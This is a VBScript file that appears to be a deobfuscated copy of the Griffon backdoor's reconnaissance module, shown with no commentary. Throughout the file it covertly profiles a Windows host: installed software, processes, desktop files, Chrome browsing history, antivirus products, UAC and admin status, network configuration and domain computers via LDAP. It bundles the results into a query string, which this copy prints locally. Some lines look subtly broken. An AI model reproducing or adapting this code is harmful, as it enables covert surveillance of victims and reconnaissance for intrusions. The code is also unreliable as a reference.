'' Griffon main actions start here.

Set file_system_object = CreateObject("Scripting.FileSystemObject")
temp_file_name = file_system_object.GetSpecialFolder(2) & "\" & file_system_object.GetTempName

' Start the detailed recon.
recon_info_str = get_network_adapter_info
network_info_str = ""
recon_info_str = recon_info_str & "SystemInfo" & "=" & get_system_info() & "&"
recon_info_str = recon_info_str & "SoftwareInfo" & "=" & get_product_or_process_info("Win32_Product") & "&"
recon_info_str = recon_info_str & "NetworkInfo" & "=" & network_info_str & "&"
recon_info_str = recon_info_str & "ProcessList" & "=" & get_product_or_process_info("Win32_Process") & "&"
recon_info_str = recon_info_str & "DesktopFileList" & "=" & get_files_on_desktop_info() & "&"
recon_info_str = recon_info_str & "DesktopScreenshot" & "=NoScreenshot&"
recon_info_str = recon_info_str & "WebHistory" & "=" & get_web_history_info & "&"
recon_info_str = recon_info_str & "SecurityInfo=" & get_security_info() & "&"
recon_info_str = recon_info_str & "UACInfo" & get_uac_info() & "&"

' Write out the recon info.
write_out_recon(recon_info_str)

' Done. Zero out variables and exit.
Set wscript_network_object = Nothing
Set unj7 = Nothing
Set wmi_object = Nothing
Set wscript_shell_object = Nothing
Set adodb_stream_object = Nothing
Set dropped_file = Nothing
Set file_system_object = Nothing

Sub write_out_recon(s)
   WScript.Echo s
End Sub

Function get_ldap_info()
   On Error Resume Next
   Err.Clear
   Const const_2 = 2
   Set adodb_connection_object = CreateObject("ADODB.Connection")
   Set adodb_stream_object = CreateObject("ADODB.Stream")
   Set wscript_network_object = CreateObject("WScript.Network")
   UserDomain = wscript_network_object.UserDomain
   Set ldap_server_info_object = GetObject("LDAP://" & UserDomain & "/RootDSE")
   If (VarType(ldap_server_info_object) <> vbObject) Then
      get_ldap_info = -1
      Exit Function
   End If
   ldap_default_naming_context = ldap_server_info_object.Get("defaultNamingContext")
   adodb_connection_object.Provider = "ADsDSOObject"
   adodb_connection_object.Open "Active Directory Provider"
   Set adodb_stream_object.ActiveConnection = adodb_connection_object
   adodb_stream_object.Properties("Page Size") = 1000
   adodb_stream_object.Properties("Searchscope") = const_2
   ldap_search_string = "LDAP://" + ldap_default_naming_context
   adodb_stream_object.CommandText = "SELECT cn FROM '" & ldap_search_string & "' WHERE objectCategory='Computer' AND objectClass='computer'"
   Set ldap_query_results = adodb_stream_object.Execute
   get_ldap_info = ldap_query_results.RecordCount
   Set adodb_connection_object  = Nothing
   Set adodb_stream_object  = Nothing
   Set ldap_server_info_object  = Nothing
   Set ldap_query_results  = Nothing
   On Error GoTo 0
End Function

Function get_uac_info()
   get_uac_info = ""
   On Error Resume Next
   Err.Clear
   Set wscript_shell_object = CreateObject("WScript.Shell")
   If wscript_shell_object.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA") = 0 Then
      get_uac_info = "UAC: Off&&&"
   Else
      get_uac_info = "UAC: On&&&"
   End If
   If wscript_shell_object.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin") = 0 Then
      get_uac_info = get_uac_info + "Will you be prompted to allow elevation for administrator: No&&&"
   Else
      get_uac_info = get_uac_info + "Will you be prompted to allow elevation for administrator: Yes&&&"
   End If
   If wscript_shell_object.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop") = 0 Then
      get_uac_info = get_uac_info + "Prompt for elevation permission prompt: Interactive&&&"
   Else
      get_uac_info = get_uac_info + "Prompt window for elevation permission: On secure desktop&&&"
   End If
   On Error GoTo 0
End Function

Function get_antivirus_info()
   get_antivirus_info = ""
   On Error Resume Next
   Err.Clear
   Set wmi_object = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\SecurityCenter2")
   For Each query_result in wmi_object.ExecQuery("Select * from AntiVirusProduct")
      get_antivirus_info = get_antivirus_info + "AntiVirus:" + query_result.displayName + "%%%"
   Next
   On Error GoTo 0
End Function

Function get_files_on_desktop_info()
   get_files_on_desktop_info = ""
   On Error Resume Next
   Err.Clear
   Set wscript_shell_object = CreateObject("WScript.Shell")
   desktop_folder_object = wscript_shell_object.SpecialFolders("Desktop")
   Set Files = file_system_object.GetFolder(desktop_folder_object).Files
   For Each File In Files
      get_files_on_desktop_info = get_files_on_desktop_info & File.Name & "%%%"
   Next
   On Error GoTo 0
End Function

Function get_processor_info()
   On Error Resume Next
   Err.Clear
   get_processor_info = ""
   Set wmi_object = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2")
   generic_loop_index = 1
   For Each query_result in wmi_object.ExecQuery("SELECT * FROM Win32_Processor",,48)
      get_processor_info = get_processor_info + "Processor" & CStr(generic_loop_index) & ": " & query_result.Caption + " ~" + CStr(query_result.MaxClockSpeed) + " Mhz" + "%%%"
      generic_loop_index = generic_loop_index + 1
   Next
   On Error GoTo 0
End Function

Function get_quickfix_engineering_info()
   On Error Resume Next
   Err.Clear
   Set wmi_object = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2")
   generic_loop_index = 0
   get_quickfix_engineering_info = ""
   For Each query_result in wmi_object.ExecQuery("SELECT * FROM Win32_QuickFixEngineering",,48)
      generic_loop_index = generic_loop_index + 1
      get_quickfix_engineering_info = get_quickfix_engineering_info + "QuickFixEngineering" & CStr(generic_loop_index) & ": " & query_result.HotFixID + "%%%"
   Next
   get_quickfix_engineering_info = "QuickFixEngineering_Count-"  & CStr(generic_loop_index) & ": " + "%%%" + get_quickfix_engineering_info
   On Error GoTo 0
End Function

Function get_pagefile_info()
   get_pagefile_info = ""
   On Error Resume Next
   Err.Clear
   Set wmi_object = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2")
   generic_loop_index = 1
   For Each query_result in wmi_object.ExecQuery("SELECT * FROM Win32_PageFileSetting",,48)
      get_pagefile_info = get_pagefile_info + "Paging file location" & CStr(generic_loop_index) & ": " & query_result.Caption + "%%%"
      generic_loop_index = generic_loop_index + 1
   Next
   If get_pagefile_info = "" Then
      generic_loop_index = 1
      For Each query_result in wmi_object.ExecQuery("SELECT * FROM Win32_PageFileUsage",,48)
         get_pagefile_info = get_pagefile_info + "Paging file location" & CStr(generic_loop_index) & ": " & query_result.Caption + "%%%"
         generic_loop_index = generic_loop_index + 1
      Next
   End If
   On Error GoTo 0
End Function

Function check_not_array(array_to_check)
   On Error Resume Next
   check_not_array = True
   If IsArray(array_to_check) Then check_not_array = False
   On Error GoTo 0
End Function

Function get_network_adapter_info()
   get_network_adapter_info=""
   On Error Resume Next
   Err.Clear
   Set wmi_object = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2")
   Set win32_group_query_results = wmi_object.ExecQuery("Select * From Win32_NetworkAdapterConfiguration   WHERE IPEnabled = True")
   For Each query_result In win32_group_query_results
      get_network_adapter_info = vbNullString
      get_network_adapter_info = get_network_adapter_info & "id=" & Replace(query_result.MACAddress, ":", "") & "&type=put&"
      get_network_adapter_info = get_network_adapter_info & "Hostname=" & query_result.DNSHostName & "&"
   Next
   Set win32_group_query_results = wmi_object.ExecQuery("Select * from            Win32_ComputerSystem")
   For Each query_result In win32_group_query_results
      If query_result.DomainRole Then
         get_network_adapter_info = get_network_adapter_info & "DomainMember=yes&"
      Else
         get_network_adapter_info = get_network_adapter_info & "DomainMember=no&"
      End If
      get_network_adapter_info = get_network_adapter_info & "DomainName=" & query_result.Domain & "&"
      If query_result.DomainRole Then
         get_network_adapter_info = get_network_adapter_info & "DomainHosts=" & get_ldap_info & "&"
      Else
         get_network_adapter_info = get_network_adapter_info & "DomainHosts=-1&"
      End If
      Set wscript_network_object = CreateObject("WScript.Network")
      network_user_name = wscript_network_object.UserName
      get_network_adapter_info = get_network_adapter_info & "UserName=" & network_user_name & "&"
   Next
   Set Drives = file_system_object.Drives
   StrDrives = ""
   For Each Drive In Drives
      StrDrives = StrDrives & Drive.DriveLetter & ":;"
   Next
   get_network_adapter_info = get_network_adapter_info & "LogicalDrives=" & StrDrives & "&"
   Set win32_group_query_results = Nothing
   Set Drives = Nothing
   Set query_result = Nothing
   Set Drive = Nothing
   On Error GoTo 0
End Function

Function get_os_info_str()
   On Error Resume Next
   Err.Clear
   Set wmi_object = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2")
   get_os_info_str = ""
   For Each query_results in wmi_object.ExecQuery("SELECT * FROM Win32_OperatingSystem",,48)
      get_os_info_str = get_os_info_str + "Hostname:" + query_results.CSName + "%%%"
      get_os_info_str = get_os_info_str + "Name_OS:" + query_results.Caption + "%%%"
      get_os_info_str = get_os_info_str + "Version_OS:" & query_results.Version + " BuildNumber : " & query_results.BuildNumber + "%%%"
      get_os_info_str = get_os_info_str + "Manufacturer_OS:" & query_results.Manufacturer + "%%%"
      get_os_info_str = get_os_info_str + "ProductType_OS:" & parse_os_from_product_type(query_results.ProductType) & "%%%"
      get_os_info_str = get_os_info_str + "BuildType_OS:" & query_results.BuildType + "%%%"
      get_os_info_str = get_os_info_str + "RegisteredUser:" & query_results.RegisteredUser + "%%%"
      get_os_info_str = get_os_info_str + "Organization:" & query_results.Organization + "%%%"
      get_os_info_str = get_os_info_str + "SerialNumber:" & query_results.SerialNumber + "%%%"
      bios_release_date = query_results.InstallDate
      bios_release_date = Mid(bios_release_date, 7, 2) + "." + Mid(bios_release_date, 5, 2) + "." + Mid(bios_release_date, 1, 4) + ", " + Mid(bios_release_date, 9, 2) + ":" + Mid(bios_release_date, 11, 2) + ":" + Mid(bios_release_date, 13, 2)
      get_os_info_str = get_os_info_str + "InstallDate:" & bios_release_date + "%%%"
      bios_release_date = query_results.LastBootUpTime
      bios_release_date = Mid(bios_release_date, 7, 2) + "." + Mid(bios_release_date, 5, 2) + "." + Mid(bios_release_date, 1, 4) + ", " + Mid(bios_release_date, 9, 2) + ":" + Mid(bios_release_date, 11, 2) + ":" + Mid(bios_release_date, 13, 2)
      get_os_info_str = get_os_info_str + "LastBootUpTime:" & bios_release_date + "%%%"
      get_os_info_str = get_os_info_str + System_manufacturer + "%%%"
      get_os_info_str = get_os_info_str + System_model + "%%%"
      get_os_info_str = get_os_info_str + SystemType + "%%%"
      get_os_info_str = get_os_info_str + "MaxNumberOfProcesses:" & CStr(query_results.MaxNumberOfProcesses) + "%%%"
      get_os_info_str = get_os_info_str + get_computer_system_info()
      get_os_info_str = get_os_info_str + get_processor_info()
      get_os_info_str = get_os_info_str + get_bios_info()
      get_os_info_str = get_os_info_str + "WindowsDirectory:" & query_results.WindowsDirectory + "%%%"
      get_os_info_str = get_os_info_str + "SystemDirectory:" & query_results.SystemDirectory + "%%%"
      get_os_info_str = get_os_info_str + "BootDevice:" & query_results.BootDevice + "%%%"
      get_os_info_str = get_os_info_str + "OSLanguage:" & extract_os_language(query_results.OSLanguage) + "%%%"
      get_os_info_str = get_os_info_str + "MUILanguages:" & Join(query_results.MUILanguages, ",") + "%%%"
      get_os_info_str = get_os_info_str + "CurrentTimeZone:" & get_timezone_info(query_results.CurrentTimeZone) + "%%%"
      get_os_info_str = get_os_info_str + "%%%"
      get_os_info_str = get_os_info_str + "FreePhysicalMemory:" & query_results.FreePhysicalMemory + "%%%"
      get_os_info_str = get_os_info_str + "TotalVirtualMemorySize:" & query_results.TotalVirtualMemorySize + "%%%"
      get_os_info_str = get_os_info_str + "FreeVirtualMemory:" & query_results.FreeVirtualMemory + "%%%"
   Next
   On Error GoTo 0
End Function

Function extract_os_language(raw_os_language_str)
   extract_os_language = ""
   On Error Resume Next
   Err.Clear
   Dim language_str, start_index, end_index
   language_str = "1;Arabic|4;Chinese(Simplified)D| China|9;English|1025;Arabic D|Saudi Arabia|1026;Bulgarian|1027;Catalan|1028;Chinese (Traditional) D| Taiwan|1029;Czech|1030;Danish|1031;German D| Germany|1032;Greek|1033;English D|UnitedStates|1034;Spanish D|Traditional Sort|1035;Finnish|1036;French D| France|1037;Hebrew|1038;Hungarian|1039;Icelandic|1040;Italian D| Italy|1041;Japanese|1042;Korean|1043;Dutch D| Netherlands|1044;Norwegian D| Bokmal|1045;Polish|1046;Portuguese D|Brazil|1047;Rhaeto-Romanic|1048;Romanian|1049;Russian|1050;Croatian|1051;Slovak|1052;Albanian|1053;Swedish|1054;Thai|1055;Turkish|1056;Urdu|1057;Indonesian|1058;Ukrainian|1059;Belarusian|1060;Slovenian|1061;Estonian|1062;Latvian|1063;Lithuanian|1065;Persian|1066;Vietnamese|1069;Basque (Basque)|1070;Serbian|1071;Macedonian(North Macedonia)|1072;Sutu|1073;Tsonga|1074;Tswana|1076;Xhosa|1077;Zulu|1078;Afrikaans|1080;Faeroese|1081;Hindi|1082;Maltese|1084;Scottish Gaelic(United Kingdom)|1085;Yiddish|1086;Malay D|Malaysia|2049;Arabic D|Iraq|2052;Chinese(Simplified) D|PRC|2055;German D|Switzerland|2057;EnglishD| UnitedKingdom|2058;Spanish D|Mexico|2060;French D|Belgium|2064;Italian D|Switzerland|2067;Dutch D|Belgium|2068;Norwegian D|Nynorsk|2070;PortugueseD| Portugal|2072;RomanianD| Moldova|2073;RussianD| Moldova|2074;SerbianD| Latin|2077;Swedish D|Finland|3073;Arabic D|Egypt|3076;Chinese(Traditional) D| HongKong SAR|3079;German D|Austria|3081;English D|Australia|3082;Spanish D|InternationalSort|3084;French D|Canada|3098;Serbian D|Cyrillic|4097;Arabic D|Libya|4100;Chinese(Simplified) D|Singapore|4103;German D|Luxembourg|4105;EnglishD| Canada|4106;Spanish D|Guatemala|4108;French D|Switzerland|5121;ArabicD| Algeria|5127;German D|Liechtenstein|5129;English D| NewZealand|5130;Spanish D|Costa Rica|5132;French D|Luxembourg|6145;Arabic D|Morocco|6153;English D|Ireland|6154;Spanish D|Panama|7169;Arabic D|Tunisia|7177;English D|South Africa|7178;SpanishD| DominicanRepublic|8193;Arabic D|Oman|8201;English D|Jamaica|8202;Spanish D|Venezuela|9217;Arabic D|Yemen|9226;Spanish D|Colombia|10241;Arabic D|Syria|10249;English D|Belize|10250;Spanish D|Peru|11265;Arabic D|Jordan|11273;English D|Trinidad|11274;Spanish D|Argentina|12289;Arabic D|Lebanon|12298;Spanish D|Ecuador|13313;Arabic D|Kuwait|13322;Spanish D|Chile|14337;Arabic D|U.A.E.|14346;Spanish D|Uruguay|15361;Arabic D|Bahrain|15370;Spanish D|Paraguay|16385;Arabic D|Qatar|16394;Spanish D|Bolivia|17418;Spanish D|El Salvador|18442;SpanishD| Honduras|19466;SpanishD|Nicaragua|20490;SpanishD| Puerto Rico|"
   start_index = inStr(1,language_str, CStr(raw_os_language_str))
   end_index = inStr(start_index,language_str, "|") - start_index
   extract_os_language = Mid(language_str, start_index, end_index)
End Function

Function get_security_info()
   get_security_info=""
   On Error Resume Next
   Err.Clear
   get_security_info = "Current_user: no_admin&&&"
   Set wmi_object = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2")
   Set win32_group_query_results = wmi_object.ExecQuery("SELECT * FROM Win32_Group",,48)
   For Each query_results in win32_group_query_results
      If query_results.SID = "S-1-5-32-544" Then
         admin_group_name = query_results.Name
      End If
   Next
   Set wscript_network_object = CreateObject("WScript.Network")
   network_user_name = wscript_network_object.UserName
   Set win32_group_query_results = wmi_object.ExecQuery("SELECT * FROM Win32_GroupUser",,48)
   For Each query_results in win32_group_query_results
      If Instr(1, query_results.GroupComponent, admin_group_name, 1) > 0 Then
         If Instr(1, query_results.PartComponent, """" + network_user_name + """", 1) > 0 Then
            get_security_info = "Current_user: admin&&&"
         End If
      End If
   Next
   get_security_info = get_security_info + get_antivirus_info + "%%%" + get_admin_privileges_info
   On Error GoTo 0
End Function

Function get_product_or_process_info(product_or_process_str)
   get_product_or_process_info = ""
   On Error Resume Next
   Err.Clear
   Set wmi_object = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2")
   Set win32_group_query_results = wmi_object.ExecQuery("SELECT * FROM" & product_or_process_str, , 48)
   get_product_or_process_info = ""
   For Each query_results In win32_group_query_results
      get_product_or_process_info = get_product_or_process_info & query_results.Name & "%%%"
   Next
   On Error GoTo 0
End Function

Function get_web_history_info()
   get_web_history_info=""
   On Error Resume Next
   Err.Clear
   Set dic = CreateObject("Scripting.Dictionary")
   Set wscript_shell_object = CreateObject("WScript.Shell")
   chrome_history_dir = wscript_shell_object.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\UserData\Default\History"
   If file_system_object.FileExists(chrome_history_dir) Then
      Set FileHistory = file_system_object.GetFile(chrome_history_dir)
      FileHistory.Copy temp_file_name
      Set adodb_stream_object = CreateObject("ADODB.Stream")
      chrome_history_array=Array()
      adodb_stream_object.Type = 1
      adodb_stream_object.Open
      adodb_stream_object.LoadFromFile(temp_file_name)
      chrome_history_array = adodb_stream_object.Read()
      adodb_stream_object.Close
      For generic_loop_index = 1 To UBound(chrome_history_array)
         istr = 0
         addstr = ""
         http = ""
         https = ""
         ' Chr(104) = 'h'
         If AscB(MidB(chrome_history_array, generic_loop_index, 1)) = 104 Then
            http = Chr(AscB(MidB(chrome_history_array, generic_loop_index, 1))) + Chr(AscB(MidB(chrome_history_array, generic_loop_index + 1, 1))) + Chr(AscB(MidB(chrome_history_array, generic_loop_index + 2, 1))) + Chr(AscB(MidB(chrome_history_array, generic_loop_index + 3, 1))) + Chr(AscB(MidB(chrome_history_array, generic_loop_index + 4, 1))) + Chr(AscB(MidB(chrome_history_array, generic_loop_index + 5, 1))) + Chr(AscB(MidB(chrome_history_array, generic_loop_index + 6, 1)))
            https = http + Chr(AscB(MidB(chrome_history_array, generic_loop_index + 7, 1)))
            If https = "https://" Then
               istr = 8
               addstr = "https://"
               While AscB(MidB(chrome_history_array, generic_loop_index + istr, 1)) > 32 And AscB(MidB(chrome_history_array, generic_loop_index + istr, 1)) < 123
                  addstr = addstr + Chr(AscB(MidB(chrome_history_array, generic_loop_index + istr, 1)))
                  istr = istr + 1
               Wend
               If Not dic.Exists(addstr) Then dic.Add addstr, generic_loop_index + istr
            ElseIf http = "http://" Then
               istr = 7
               addstr = "http://"
               While AscB(MidB(chrome_history_array, generic_loop_index + istr, 1)) > 32 And AscB(MidB(chrome_history_array, generic_loop_index + istr, 1)) < 123
                  addstr = addstr + Chr(AscB(MidB(chrome_history_array, generic_loop_index + istr, 1)))
                  istr = istr + 1
               Wend
               If Not dic.Exists(addstr) Then dic.Add addstr, generic_loop_index + istr
            End If
         End If
      Next
      For Each e In dic.Keys
         If len(get_web_history_info) > 300000 Then Exit For
         get_web_history_info = get_web_history_info & e &  + "%%%"
      Next
      file_system_object.DeleteFile temp_file_name
   Else
      get_web_history_info = "nothing"
   End If
   On Error GoTo 0
End Function

Function decode_base64_str(base64_str)
   decode_base64_str = ""
   On Error Resume Next
   Err.Clear
   With CreateObject("CDO.Message").BodyPart
      .ContentTransferEncoding = "base64"
      .Charset = "utf-8"
      With .GetEncodedContentStream
         .WriteText base64_str
         .Flush
      End With
      With .GetDecodedContentStream
         .Charset = "utf-8"
         decode_base64_str = .ReadText
      End With
   End With
   On Error GoTo 0
End Function

Function get_system_info()
   get_system_info=""
   get_system_info = get_system_info + get_os_info_str()
   get_system_info = get_system_info + get_pagefile_info()
   get_system_info = get_system_info + get_quickfix_engineering_info()
   get_system_info = get_system_info + get_detailed_network_adapter_info()
End Function

Function get_timezone_info(curr_timezone_as_int)
   get_timezone_info = ""
   On Error Resume Next
   Err.Clear
   If Sgn(curr_timezone_as_int) = 1 Then
      get_timezone_info = "UTC+"
   Else
      get_timezone_info = "UTC-"
   End If
   If curr_timezone_as_int\60 < 10 Then
      get_timezone_info = get_timezone_info + "0" + CStr(curr_timezone_as_int\60) + ":"
   Else
      get_timezone_info = get_timezone_info + CStr(curr_timezone_as_int\60) + ":"
   End If
   If curr_timezone_as_int Mod 60 < 10 Then
      get_timezone_info = get_timezone_info + "0" + CStr(curr_timezone_as_int Mod 60)
   Else
      get_timezone_info = get_timezone_info + CStr(curr_timezone_as_int Mod 60)
   End If
   On Error GoTo 0
End Function

Function decode_base64_str_1(w56ucmczmd50)
   decode_base64_str_1 = vbNull
   On Error Resume Next
   Err.Clear
   Set domdocument_object = CreateObject("MSXml2.DOMDocument")
   Set tmp_element = domdocument_object.createElement("tmp")
   tmp_element.DataType = "bin.base64"
   tmp_element.text = w56ucmczmd50
   decode_base64_str_1 = tmp_element.NodeTypedValue
   Set domdocument_object = Nothing
   Set tmp_element = Nothing
   On Error GoTo 0
End Function

Function get_bios_info()
   On Error Resume Next
   Err.Clear
   get_bios_info = ""
   Set wmi_object = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2")
   For Each query_results in wmi_object.ExecQuery("SELECT * FROM Win32_BIOS",,48)
      generic_loop_index = generic_loop_index + 1
      bios_release_date = query_results.ReleaseDate
      bios_release_date = Mid(bios_release_date, 7, 2) + "." + Mid(bios_release_date, 5, 2) + "." + Mid(bios_release_date, 1, 4)
      get_bios_info = "BIOS_version:" & query_results.Name + ", " + query_results.SMBIOSBIOSVersion + ", " + bios_release_date + "%%%"
   Next
   On Error GoTo 0
End Function

Function get_binary_chunk(data_to_chunk)
   get_binary_chunk = vbNull
   On Error Resume Next
   Err.Clear
   Dim recordset_object, len_data, data_as_binary_chunk
   Const const_205 = 205
   Set recordset_object = CreateObject("ADODB.Recordset")
   len_data = LenB(data_to_chunk)
   If len_data>0 Then
      recordset_object.Fields.Append "mBinary", const_205, len_data
      recordset_object.Open
      recordset_object.AddNew
      recordset_object("mBinary").AppendChunk data_to_chunk & ChrB(0)
      recordset_object.Update
      data_as_binary_chunk = recordset_object("mBinary").GetChunk(len_data)
   End If
   get_binary_chunk = data_as_binary_chunk
   On Error GoTo 0
End Function

Function parse_os_from_product_type(product_type_query_results)
   parse_os_from_product_type = ""
   On Error Resume Next
   Err.Clear
   Dim os_start_marker, start_index, end_index
   os_start_marker = "1;Work StatioControlle"
   start_index = inStr(1,os_start_marker, CStr(product_type_query_results))
   end_index = inStr(start_index,os_start_marker, "|") - start_index
   parse_os_from_product_type = Mid(os_start_marker, start_index, end_index)
   On Error GoTo 0
End Function

Function get_detailed_network_adapter_info()
   On Error Resume Next
   Err.Clear
   get_detailed_network_adapter_info = ""
   Set physical_adapter_dict = CreateObject("Scripting.Dictionary")
   Set netconnection_id_dict = CreateObject("Scripting.Dictionary")
   Set dhcp_enabled_dict = CreateObject("Scripting.Dictionary")
   Set dhcp_server_dict = CreateObject("Scripting.Dictionary")
   Set ip_address_dict = CreateObject("Scripting.Dictionary")
   Set mac_address_dict = CreateObject("Scripting.Dictionary")
   Set default_ip_gateway_dict = CreateObject("Scripting.Dictionary")
   Set dns_domain_suffix_search_order_dict = CreateObject("Scripting.Dictionary")
   Set ip_subnet_dict = CreateObject("Scripting.Dictionary")
   Set dns_server_search_order_dict = CreateObject("Scripting.Dictionary")
   Set wmi_object = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2")
   generic_loop_index = 0
   For Each query_results In wmi_object.ExecQuery("SELECT * FROM Win32_NetworkAdapter", , 48)
      If query_results.PhysicalAdapter Then
         physical_adapter_dict.Add query_results.Caption, query_results.Name
         netconnection_id_dict.Add query_results.Caption, query_results.NetConnectionID
         generic_loop_index = generic_loop_index + 1
      End If
   Next
   get_detailed_network_adapter_info = get_detailed_network_adapter_info + "NetworkAdapter_Count -" & CStr(generic_loop_index) & ": " + "%%%"
   generic_loop_index = 0
   For Each query_results In wmi_object.ExecQuery("Select * From Win32_NetworkAdapterConfiguration WHERE IPEnabled = True", , 48)
      If physical_adapter_dict.Exists(query_results.Caption) Then
         If Not IsNull(query_results.DHCPEnabled) Then dhcp_enabled_dict.Add query_results.Caption, query_results.DHCPEnabled
         If Not IsNull(query_results.DHCPServer) Then dhcp_server_dict.Add query_results.Caption, query_results.DHCPServer
         If Not IsNull(query_results.DNSDomainSuffixSearchOrder) Then dns_domain_suffix_search_order_dict.Add query_results.Caption, Join(query_results.DNSDomainSuffixSearchOrder, ",")
         If Not IsNull(query_results.MACAddress) Then mac_address_dict.Add query_results.Caption, query_results.MACAddress
         If Not IsNull(query_results.DefaultIPGateway) Then
            If Not check_not_array(query_results.DefaultIPGateway) Then
               default_ip_gateway_dict.Add query_results.Caption, Join(query_results.DefaultIPGateway, ",")
            Else
               default_ip_gateway_dict.Add query_results.Caption, query_results.DefaultIPGateway
            End If
         End If
         generic_loop_index = generic_loop_index + 1
         get_detailed_network_adapter_info = get_detailed_network_adapter_info + "NetworkAdapter" & CStr(generic_loop_index) & ": " & physical_adapter_dict.Item(query_results.Caption) + "%%%" + "Connection name: " + netconnection_id_dict.Item(query_results.Caption) + "%%%"
         If query_results.DHCPEnabled Then
            get_detailed_network_adapter_info = get_detailed_network_adapter_info + "DHCPEnabled:" & CStr(query_results.DHCPEnabled)
            get_detailed_network_adapter_info = get_detailed_network_adapter_info + "%%%"
            get_detailed_network_adapter_info = get_detailed_network_adapter_info + "DHCPServer:" & query_results.DHCPServer
            get_detailed_network_adapter_info = get_detailed_network_adapter_info + "%%%"
         End If
         If Not IsNull(query_results.IPAddress) Then
            If Not check_not_array(query_results.IPAddress) Then
               ip_address_dict.Add query_results.Caption, Join(query_results.IPAddress, ",")
               get_detailed_network_adapter_info = get_detailed_network_adapter_info + "IPAddress:" & Join(query_results.IPAddress, ",") + "%%%"
            Else
               ip_address_dict.Add query_results.Caption, query_results.IPAddress
               get_detailed_network_adapter_info = get_detailed_network_adapter_info + "IPAddress:" & query_results.IPAddress + "%%%"
            End If
         End If
         If Not IsNull(query_results.IPSubnet) Then
            ip_subnet_dict.Add query_results.Caption, Join(query_results.IPSubnet, ",")
         End If
         If check_not_array(query_results.DNSServerSearchOrder) Then
            dns_server_search_order_dict.Add query_results.Caption, ""
         Else
            dns_server_search_order_dict.Add query_results.Caption, Join(query_results.DNSServerSearchOrder, ",")
         End If
      End If
   Next
   On Error GoTo 0
   network_info_str = ""
   On Error Resume Next
   Err.Clear
   v8tsv14kl6 = ""
   For Each varKey In physical_adapter_dict.Keys
      If netconnection_id_dict.Exists(varKey) Then v8tsv14kl6 = v8tsv14kl6 + "Adapter:" + netconnection_id_dict.Item(varKey) & "%%%"
      If dns_domain_suffix_search_order_dict.Exists(varKey) Then v8tsv14kl6 = v8tsv14kl6 + "DNSDomainSuffix:" + dns_domain_suffix_search_order_dict.Item(varKey) & "%%%"
      If mac_address_dict.Exists(varKey) Then v8tsv14kl6 = v8tsv14kl6 + "MACAddress:" + mac_address_dict.Item(varKey) & "%%%"
      If dhcp_enabled_dict.Exists(varKey) Then v8tsv14kl6 = v8tsv14kl6 + "DHCPEnabled:" + CStr(dhcp_enabled_dict.Item(varKey)) & "%%%"
      If ip_address_dict.Exists(varKey) Then v8tsv14kl6 = v8tsv14kl6 + "IPAddress:" + ip_address_dict.Item(varKey) & "%%%"
      If ip_subnet_dict.Exists(varKey) Then v8tsv14kl6 = v8tsv14kl6 + "IPSubnet:" + ip_subnet_dict.Item(varKey) & "%%%"
      If default_ip_gateway_dict.Exists(varKey) Then v8tsv14kl6 = v8tsv14kl6 + "DefaultIPGateway:" + default_ip_gateway_dict.Item(varKey) & "%%%"
      If dhcp_server_dict.Exists(varKey) Then v8tsv14kl6 = v8tsv14kl6 + "DHCPServer:" + dhcp_server_dict.Item(varKey) & "%%%"
      If dns_server_search_order_dict.Exists(varKey) Then v8tsv14kl6 = v8tsv14kl6 + "DNSServers:" + dns_server_search_order_dict.Item(varKey) & "%%%"
   Next
   network_info_str = v8tsv14kl6
   On Error GoTo 0
End Function

Function get_computer_system_info()
   get_computer_system_info = ""
   On Error Resume Next
   Err.Clear
   Set wmi_object = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2")
   For Each query_results in wmi_object.ExecQuery("SELECT * FROM Win32_ComputerSystem",,48)
      get_computer_system_info = "SystemType:" & query_results.SystemType + "%%%"
      get_computer_system_info = get_computer_system_info & "TotalPhysicalMemory:" & query_results.TotalPhysicalMemory + "%%%"
      get_computer_system_info = get_computer_system_info & "Domain:" & query_results.Domain + "%%%"
      get_computer_system_info = get_computer_system_info & "System_manufacturer:" & query_results.Manufacturer + "%%%"
      get_computer_system_info = get_computer_system_info & "System_model:" & query_results.Model + "%%%"
   Next
   On Error GoTo 0
End Function

Function get_admin_privileges_info()
   On Error Resume Next
   Set wscript_shell_object = CreateObject("WScript.Shell")
   wscript_shell_object.RegRead("HKEY_USERS\S-1-5-19\Environment\TEMP")
   if Err.number = 0 Then
      get_admin_privileges_info = "Admin_privileges: Enabled"
   else
      get_admin_privileges_info = "Admin_privileges: Disabled"
   end if
   Err.Clear
   On Error goto 0
End Function
